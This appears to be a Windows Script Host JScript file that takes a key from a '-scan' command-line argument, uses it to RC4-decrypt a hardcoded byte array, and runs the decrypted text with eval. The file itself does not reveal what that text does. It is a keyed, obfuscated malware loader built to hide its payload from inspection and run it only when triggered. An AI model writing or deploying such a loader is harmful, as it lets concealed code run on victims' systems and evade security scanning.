var args = WScript.Arguments;
var key = "";
for (var i = 0; i < args.length; i++) {
    if (args(i) == "-scan" && i + 1 < args.length) {
        key = args(i + 1);
        break;
    }
}
if (key == "") { WScript.Quit(1); }

var ciphertext = [0x37, 0xA1, 0x72, 0x98, 0x7D, 0xD3, 0x6B, 0xAF, 0x7C, 0xF8, 0x88, 0x9F, 0xDC, 0x38, 0xDC, 0x61, 0x30, 0xA9, 0xD9, 0x9D, 0x67, 0xB5, 0x82, 0x1C, 0xC7, 0x82, 0xA9, 0xE7, 0x53, 0xFF, 0x3F, 0xB6, 0x31, 0x5E, 0x3D, 0xA5, 0x62, 0x83, 0x01, 0xB4, 0xFC, 0xDC, 0x7F, 0x7A, 0x40, 0x6A];

var S = [];
for (var i = 0; i < 256; i++) S[i] = i;
var j = 0;
for (var i = 0; i < 256; i++) {
    j = (j + S[i] + key.charCodeAt(i % key.length)) % 256;
    var tmp = S[i]; S[i] = S[j]; S[j] = tmp;
}

var ci = 0, cj = 0;
var plaintext = "";
for (var k = 0; k < ciphertext.length; k++) {
    ci = (ci + 1) % 256;
    cj = (cj + S[ci]) % 256;
    var tmp = S[ci]; S[ci] = S[cj]; S[cj] = tmp;
    plaintext += String.fromCharCode(ciphertext[k] ^ S[(S[ci] + S[cj]) % 256]);
}

eval(plaintext);
